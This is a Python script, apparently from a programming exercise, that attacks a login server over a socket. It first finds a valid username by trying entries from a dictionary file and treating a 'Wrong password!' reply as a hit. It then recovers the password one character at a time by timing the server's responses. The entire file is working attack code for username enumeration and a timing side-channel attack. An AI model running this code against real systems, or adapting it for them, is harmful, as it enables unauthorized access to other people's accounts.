
import socket
import sys
import json
import string
import time

# Check command line arguments
if len(sys.argv) != 3:
    print("Error: Please provide the IP address and port.")
    print("Usage: python hack.py <IP Address> <Port>")
    sys.exit(1)

hostname = sys.argv[1]
port = int(sys.argv[2])
address = (hostname, port)

# Create socket and connect to server
client_socket = socket.socket()
try:
    client_socket.connect(address)
except ConnectionRefusedError:
    print("Error: Connection refused. Make sure the server is running.")
    sys.exit(1)
except Exception as e:
    print(f"Error connecting to server: {e}")
    sys.exit(1)

# Function to read logins from the dictionary file
def read_login_dictionary():
    try:
        with open('logins.txt', 'r') as file:
            for line in file:
                login = line.strip()
                if login:  # Skip empty lines
                    yield login
    except FileNotFoundError:
        print("Error: logins.txt file not found. Make sure it exists in the current directory.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading logins.txt: {e}")
        sys.exit(1)

# Find the correct login
correct_login = None
for login in read_login_dictionary():
    # Create a JSON request with the login and a dummy password
    request = {
        "login": login,
        "password": ""
    }

    # Send the request
    client_socket.send(json.dumps(request).encode())

    # Receive the response
    try:
        response_data = client_socket.recv(1024).decode()
        response = json.loads(response_data)

        # Check if the response has the expected format
        if "result" not in response:
            print(f"Error: Unexpected response format from server: {response_data}")
            continue

        # Check if the login is correct (server responds with "Wrong password!" when login is correct)
        if response["result"] == "Wrong password!":
            correct_login = login
            break
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON response from server: {response_data}")
        continue
    except Exception as e:
        print(f"Error receiving response from server: {e}")
        client_socket.close()
        sys.exit(1)

# Check if we found a valid login
if correct_login is None:
    print("Error: Could not find a valid login. Exiting.")
    client_socket.close()
    sys.exit(1)

# Find the password character by character
password = ""
possible_chars = string.ascii_letters + string.digits

while True:
    found_next_char = False
    for char in possible_chars:
        # Create a JSON request with the correct login and the current password attempt
        request = {
            "login": correct_login,
            "password": password + char
        }

        # Send the request and measure response time
        start_time = time.time()
        client_socket.send(json.dumps(request).encode())

        # Receive the response
        try:
            response_data = client_socket.recv(1024).decode()
            end_time = time.time()
            response_time = end_time - start_time
            response = json.loads(response_data)

            # Check if the response has the expected format
            if "result" not in response:
                print(f"Error: Unexpected response format from server: {response_data}")
                continue

            # Check if we found the correct password
            if response["result"] == "Connection success!":
                password += char
                # Output the result in JSON format
                result = {
                    "login": correct_login,
                    "password": password
                }
                print(json.dumps(result))
                client_socket.close()
                sys.exit(0)

            # Check if we found the correct character (time-based vulnerability)
            if response_time >= 0.1:  # If the response takes longer, it's likely the correct character
                password += char
                found_next_char = True
                break
        except json.JSONDecodeError:
            print(f"Error: Invalid JSON response from server: {response_data}")
            continue
        except Exception as e:
            print(f"Error receiving response from server: {e}")
            client_socket.close()
            sys.exit(1)

    # If no correct character was found, exit the loop
    if not found_next_char:
        break

# Close the socket if no password was found
client_socket.close()
